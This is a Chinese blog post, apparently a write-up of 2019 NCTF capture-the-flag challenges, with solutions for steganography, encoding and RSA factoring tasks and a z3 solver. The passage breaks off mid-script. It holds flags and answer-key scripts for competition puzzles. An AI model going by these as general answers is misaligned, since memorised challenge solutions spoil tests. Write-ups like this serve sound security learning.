
<!DOCTYPE html>
<html lang="Zh-CN" class="loading">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>2019NCTF(some) - Ximu</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="Xibai,"> 
    <meta name="description" content="这里是正在努力追赶大佬的小可啊QAQ嘤嘤嘤,2019-NCTF是什么压垮了我的身躯，是沉重的专业课作业！！！这次比赛的时间刚好要我这个萌新肝作业，本来就菜，还遭遇如此变故，太难了。。。只来得及看了一点点题目时间就不够用了，唉，叭说了
MISC,"> 
    <meta name="author" content="Ximu"> 
    <link rel="alternative" href="atom.xml" title="Ximu" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <link rel="stylesheet" href="/css/diaspora.css">
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
</head>
</html>
<body class="loading">
    <span id="config-title" style="display:none">Ximu</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="icon-home image-icon" href="javascript:;" data-url="http://xibai.xyz"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle">2019NCTF(some)</h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class="main">
        <h1 class="title">2019NCTF(some)</h1>
        <div class="stuff">
            <span>十一月 25, 2019</span>
            
  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF/">CTF</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Writeup/">Writeup</a></li></ul>


        </div>
        <div class="content markdown">
            <h1 id="2019-NCTF"><a href="#2019-NCTF" class="headerlink" title="2019-NCTF"></a>2019-NCTF</h1><p>是什么压垮了我的身躯，是沉重的专业课作业！！！这次比赛的时间刚好要我这个萌新肝作业，本来就菜，还遭遇如此变故，太难了。。。只来得及看了一点点题目时间就不够用了，唉，叭说了</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>做个问卷，无坑，还以为会在问卷里面遇到什么坑呢</p>
<h3 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h3><p>这个题一开始没反应过来，作业使我僵化emmm</p>
<p>用<code>pip install --user 2019xxxxxx</code>的命令安装pip库之后去查看该库的文件，只有安装记录和一个py脚本，内容是flag已经在本地了。</p>
<p>想到应该是安装脚本有东西，wget下载库包，直接查看其中的<code>setup.py</code>，发现东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path, system</span><br><span class="line"></span><br><span class="line">tmp_file = tempfile.gettempdir() + path.sep + <span class="string">'.f14g_is_here'</span></span><br><span class="line">f = open(tmp_file, <span class="string">'w'</span>)</span><br><span class="line">f.write(<span class="string">'TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>它在本地临时文件夹留下了<code>.f14g_is_here</code>，内容为<code>TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9</code>，直觉base64。</p>
<h3 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h3><p>直接改后缀解压缩，拿到俩张图一个hint</p>
<p>hint：寻找像素中的秘密</p>
<p>一开始以为是盲水印，发现没东西，用Stegsolve.jar对比俩张图也没东西，最后想到好久没见过的容差对比，用Beyond_Compare加载俩张图片直接看到二维码，扫码得flag</p>
<h3 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h3><p>winhex查看，发现结尾数据不是图片结尾，是word文档，搜索<code>FFD9</code>，从图片数据结尾处手动提取出word数据保存出来。打开发现只有一句话，说有一串奇怪的字符，查看隐藏文字拿到该字符串</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125164149476.png" alt="image-20191125164149476" style="zoom:100%;"></p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125164758131.png" alt="image-20191125164758131"></p>
<p>带特殊字符，长得像uu，一开始以为是uu，解不通，遂遍历各加密，其皆带殊字，无解，仅余base族未试，奈何需付费，终弃之。后经佬告知，python3.x的base64库带有base64以上的解密算法，可直接用。。。哭~~</p>
<p>最后用 python3 的 base85 解码得flag</p>
<h3 id="what‘s-this"><a href="#what‘s-this" class="headerlink" title="what‘s this"></a>what‘s this</h3><p>存在压缩包，导出，解压得到.txt文件。</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125195513454.png" alt="image-20191125195513454"></p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125195540251.png" alt="image-20191125195540251"></p>
<p>Base64隐写，跑一下脚本就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">"What1s7his.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">data = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">print</span> ord(<span class="string">'N'</span>),ord(<span class="string">'C'</span>),ord(<span class="string">'T'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    str=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        str+=j</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'='</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> base64.b64decode(str):</span><br><span class="line">        <span class="keyword">if</span> ord(j)&lt;=<span class="number">126</span> <span class="keyword">and</span> ord(j)&gt;=<span class="number">32</span>:</span><br><span class="line">            a+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">print</span> base64.b64decode(str)</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h3><p>​    ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</p>
<p>都是26键第一行字母，和上面数字对应</p>
<p>​    q-1    w-2    e-3    r-4    t-5    y-6    u-7    i-8    o-9    p-0</p>
<p>9键对应过去</p>
<p>y    999     o    666     u    88     a    2     r    777     e    33     s    7777     o    666     s    7777</p>
<p>m    6     a    2     r    777     t    8     t    8     h    44     a    2     t    8     t    8     h    44     i    444</p>
<p>s    7777     i    444    s    7777    j    5     u    88     s    7777     t    8     a    2     p    7     i    444</p>
<p>e    33     c    222     e    33     o    666     f    333     c    222     a    2     k    55     e    33</p>
<p>NCTF{youaresosmartthatthisisjustapieceofcake}</p>
<h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b=[]</span><br><span class="line">f=[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">61</span>,<span class="number">101</span>,<span class="number">33871</span>,<span class="number">91781</span>,<span class="number">112939</span>]</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">global</span> a</span><br><span class="line">        <span class="keyword">if</span>(s&lt;<span class="number">120000</span>):</span><br><span class="line">            b.append(s)</span><br><span class="line">            a +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(s*f[i]&lt;<span class="number">120000</span>):</span><br><span class="line">            b.append(s*f[i])</span><br><span class="line">            a +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dfs(i+<span class="number">1</span>,s)</span><br><span class="line">        dfs(i+<span class="number">1</span>,s*f[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextPrime</span><span class="params">(n)</span>:</span></span><br><span class="line">    n += <span class="number">2</span> <span class="keyword">if</span> n &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(n):</span><br><span class="line">        n += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">x = e * d - <span class="number">1</span></span><br><span class="line">dfs(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(a):</span><br><span class="line">    xx = x // b[j]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">        xxx = xx + i * i</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(xxx,<span class="number">2</span>)[<span class="number">1</span>]==<span class="number">1</span>):</span><br><span class="line">            p=gmpy2.iroot(xxx,<span class="number">2</span>)[<span class="number">0</span>] - i + <span class="number">1</span></span><br><span class="line">q = nextPrime(p)</span><br><span class="line">n=p*q</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">m_hex = hex(m)[<span class="number">2</span>:]</span><br><span class="line">print((binascii.a2b_hex(m_hex)))</span><br></pre></td></tr></table></figure>
<h3 id="childyrsa"><a href="#childyrsa" class="headerlink" title="childyrsa"></a>childyrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line"></span><br><span class="line">n = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">c = <span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">sqr=int(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> sieve_base:</span><br><span class="line">  i = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">​    i *=p</span><br><span class="line">​    <span class="keyword">if</span>(i&gt;sqr):</span><br><span class="line">​      <span class="keyword">break</span></span><br><span class="line">  a = a*i</span><br><span class="line"></span><br><span class="line">p=fractions.gcd(pow(<span class="number">3</span>,a,n)<span class="number">-1</span>,n)</span><br><span class="line">q=n//p</span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">m_hex = hex(m)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">print((binascii.a2b_hex(m_hex)))</span><br></pre></td></tr></table></figure>
<p>NCTF{Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3}</p>
<h3 id="sore"><a href="#sore" class="headerlink" title="sore"></a>sore</h3><p>Vigenere Cipher ，没跑出来</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>真就签到鸭</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125200000138.png" alt="image-20191125200000138"></p>
<p> 开头那个函数没啥用，<strong>sub_401340（&amp;v4）</strong>用到了我们的输入，进去发现是一堆方程</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125201907307.png" alt="image-20191125201907307"></p>
<p>方程的运算结果已给出，用z3跑一下就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">flag = [Int(<span class="string">'flag%d'</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">    solver.add(flag[i]&gt;=<span class="number">32</span>)</span><br><span class="line">    solver.add(flag[i]&lt;=<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">str = [<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">18564</span>,  <span class="number">37316</span>,  <span class="number">32053</span>,  <span class="number">33278</span>,  <span class="number">23993</span>,  <span class="number">33151</span>,  <span class="number">15248</span>,  <span class="number">13719</span>,  <span class="number">34137</span>,  <span class="number">27391</span>,  <span class="number">28639</span>,  <span class="number">18453</span>,  <span class="number">28465</span>,  <span class="number">12384</span>,  <span class="number">20780</span>,  <span class="number">45085</span>,  <span class="number">35827</span>,  <span class="number">37243</span>,  <span class="number">26037</span>,  <span class="number">39409</span>,  <span class="number">17583</span>,  <span class="number">20825</span>,  <span class="number">44474</span>,  <span class="number">35138</span>,  <span class="number">36914</span>,  <span class="number">25918</span>,  <span class="number">38915</span>,  <span class="number">17672</span>,  <span class="number">21219</span>,  <span class="number">43935</span>,  <span class="number">37072</span>,  <span class="number">39359</span>,  <span class="number">27793</span>,  <span class="number">41447</span>,  <span class="number">18098</span>,  <span class="number">21335</span>,  <span class="number">46164</span>,  <span class="number">38698</span>,  <span class="number">39084</span>,  <span class="number">29205</span>,  <span class="number">40913</span>,  <span class="number">19117</span>,  <span class="number">21786</span>,  <span class="number">46573</span>,  <span class="number">38322</span>,  <span class="number">41017</span>,  <span class="number">29298</span>,  <span class="number">43409</span>,  <span class="number">19655</span>]</span><br><span class="line"></span><br><span class="line">solver.add(str[<span class="number">2</span>] == <span class="number">34</span> * flag[<span class="number">3</span>] + <span class="number">12</span> * flag[<span class="number">0</span>] + <span class="number">53</span> * flag[<span class="number">1</span>] + <span class="number">6</span> * flag[<span class="number">2</span>] + <span class="number">58</span> * flag[<span class="number">4</span>] + <span class="number">36</span> * flag[<span class="number">5</span>] + flag[<span class="number">6</span>])</span><br><span class="line">solver.add(str[<span class="number">3</span>] == <span class="number">27</span> * flag[<span class="number">4</span>] + <span class="number">73</span> * flag[<span class="number">3</span>] + <span class="number">12</span> * flag[<span class="number">2</span>] + <span class="number">83</span> * flag[<span class="number">0</span>] + <span class="number">85</span> * flag[<span class="number">1</span>] + <span class="number">96</span> * flag[<span class="number">5</span>] + <span class="number">52</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(str[<span class="number">4</span>] == <span class="number">24</span> * flag[<span class="number">2</span>] + <span class="number">78</span> * flag[<span class="number">0</span>] + <span class="number">53</span> * flag[<span class="number">1</span>] + <span class="number">36</span> * flag[<span class="number">3</span>] + <span class="number">86</span> * flag[<span class="number">4</span>] + <span class="number">25</span> * flag[<span class="number">5</span>] + <span class="number">46</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(str[<span class="number">5</span>] == <span class="number">78</span> * flag[<span class="number">1</span>] + <span class="number">39</span> * flag[<span class="number">0</span>] + <span class="number">52</span> * flag[<span class="number">2</span>] + <span class="number">9</span> * flag[<span class="number">3</span>] + <span class="number">62</span> * flag[<span class="number">4</span>] + <span class="number">37</span> * flag[<span class="number">5</span>] + <span class="number">84</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(str[<span class="number">6</span>] == <span class="number">48</span> * flag[<span class="number">4</span>] + <span class="number">6</span> * flag[<span class="number">1</span>] + <span class="number">23</span> * flag[<span class="number">0</span>] + <span class="number">14</span> * flag[<span class="number">2</span>] + <span class="number">74</span> * flag[<span class="number">3</span>] + <span class="number">12</span> * flag[<span class="number">5</span>] + <span class="number">83</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(str[<span class="number">7</span>] == <span class="number">15</span> * flag[<span class="number">5</span>] + <span class="number">48</span> * flag[<span class="number">4</span>] + <span class="number">92</span> * flag[<span class="number">2</span>] + <span class="number">85</span> * flag[<span class="number">1</span>] + <span class="number">27</span> * flag[<span class="number">0</span>] + <span class="number">42</span> * flag[<span class="number">3</span>] + <span class="number">72</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(str[<span class="number">8</span>] == <span class="number">26</span> * flag[<span class="number">5</span>] + <span class="number">67</span> * flag[<span class="number">3</span>] + <span class="number">6</span> * flag[<span class="number">1</span>] + <span class="number">4</span> * flag[<span class="number">0</span>] + <span class="number">3</span> * flag[<span class="number">2</span>] + <span class="number">68</span> * flag[<span class="number">6</span>])</span><br><span class="line">solver.add(str[<span class="number">9</span>] == <span class="number">34</span> * flag[<span class="number">10</span>] + <span class="number">12</span> * flag[<span class="number">7</span>] + <span class="number">53</span> * flag[<span class="number">8</span>] + <span class="number">6</span> * flag[<span class="number">9</span>] + <span class="number">58</span> * flag[<span class="number">11</span>] + <span class="number">36</span> * flag[<span class="number">12</span>] + flag[<span class="number">13</span>])</span><br><span class="line">solver.add(str[<span class="number">10</span>] == <span class="number">27</span> * flag[<span class="number">11</span>] + <span class="number">73</span> * flag[<span class="number">10</span>] + <span class="number">12</span> * flag[<span class="number">9</span>] + <span class="number">83</span> * flag[<span class="number">7</span>] + <span class="number">85</span> * flag[<span class="number">8</span>] + <span class="number">96</span> * flag[<span class="number">12</span>] + <span class="number">52</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(str[<span class="number">11</span>] == <span class="number">24</span> * flag[<span class="number">9</span>] + <span class="number">78</span> * flag[<span class="number">7</span>] + <span class="number">53</span> * flag[<span class="number">8</span>] + <span class="number">36</span> * flag[<span class="number">10</span>] + <span class="number">86</span> * flag[<span class="number">11</span>] + <span class="number">25</span> * flag[<span class="number">12</span>] + <span class="number">46</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(str[<span class="number">12</span>] == <span class="number">78</span> * flag[<span class="number">8</span>] + <span class="number">39</span> * flag[<span class="number">7</span>] + <span class="number">52</span> * flag[<span class="number">9</span>] + <span class="number">9</span> * flag[<span class="number">10</span>] + <span class="number">62</span> * flag[<span class="number">11</span>] + <span class="number">37</span> * flag[<span class="number">12</span>] + <span class="number">84</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(str[<span class="number">13</span>] == <span class="number">48</span> * flag[<span class="number">11</span>] + <span class="number">6</span> * flag[<span class="number">8</span>] + <span class="number">23</span> * flag[<span class="number">7</span>] + <span class="number">14</span> * flag[<span class="number">9</span>] + <span class="number">74</span> * flag[<span class="number">10</span>] + <span class="number">12</span> * flag[<span class="number">12</span>] + <span class="number">83</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(str[<span class="number">14</span>] == <span class="number">15</span> * flag[<span class="number">12</span>] + <span class="number">48</span> * flag[<span class="number">11</span>] + <span class="number">92</span> * flag[<span class="number">9</span>] + <span class="number">85</span> * flag[<span class="number">8</span>] + <span class="number">27</span> * flag[<span class="number">7</span>] + <span class="number">42</span> * flag[<span class="number">10</span>] + <span class="number">72</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(str[<span class="number">15</span>] == <span class="number">26</span> * flag[<span class="number">12</span>] + <span class="number">67</span> * flag[<span class="number">10</span>] + <span class="number">6</span> * flag[<span class="number">8</span>] + <span class="number">4</span> * flag[<span class="number">7</span>] + <span class="number">3</span> * flag[<span class="number">9</span>] + <span class="number">68</span> * flag[<span class="number">13</span>])</span><br><span class="line">solver.add(str[<span class="number">16</span>] == <span class="number">34</span> * flag[<span class="number">17</span>] + <span class="number">12</span> * flag[<span class="number">14</span>] + <span class="number">53</span> * flag[<span class="number">15</span>] + <span class="number">6</span> * flag[<span class="number">16</span>] + <span class="number">58</span> * flag[<span class="number">18</span>] + <span class="number">36</span> * flag[<span class="number">19</span>] + flag[<span class="number">20</span>])</span><br><span class="line">solver.add(str[<span class="number">17</span>] == <span class="number">27</span> * flag[<span class="number">18</span>] + <span class="number">73</span> * flag[<span class="number">17</span>] + <span class="number">12</span> * flag[<span class="number">16</span>] + <span class="number">83</span> * flag[<span class="number">14</span>] + <span class="number">85</span> * flag[<span class="number">15</span>] + <span class="number">96</span> * flag[<span class="number">19</span>] + <span class="number">52</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(str[<span class="number">18</span>] == <span class="number">24</span> * flag[<span class="number">16</span>] + <span class="number">78</span> * flag[<span class="number">14</span>] + <span class="number">53</span> * flag[<span class="number">15</span>] + <span class="number">36</span> * flag[<span class="number">17</span>] + <span class="number">86</span> * flag[<span class="number">18</span>] + <span class="number">25</span> * flag[<span class="number">19</span>] + <span class="number">46</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(str[<span class="number">19</span>] == <span class="number">78</span> * flag[<span class="number">15</span>] + <span class="number">39</span> * flag[<span class="number">14</span>] + <span class="number">52</span> * flag[<span class="number">16</span>] + <span class="number">9</span> * flag[<span class="number">17</span>] + <span class="number">62</span> * flag[<span class="number">18</span>] + <span class="number">37</span> * flag[<span class="number">19</span>] + <span class="number">84</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(str[<span class="number">20</span>] == <span class="number">48</span> * flag[<span class="number">18</span>] + <span 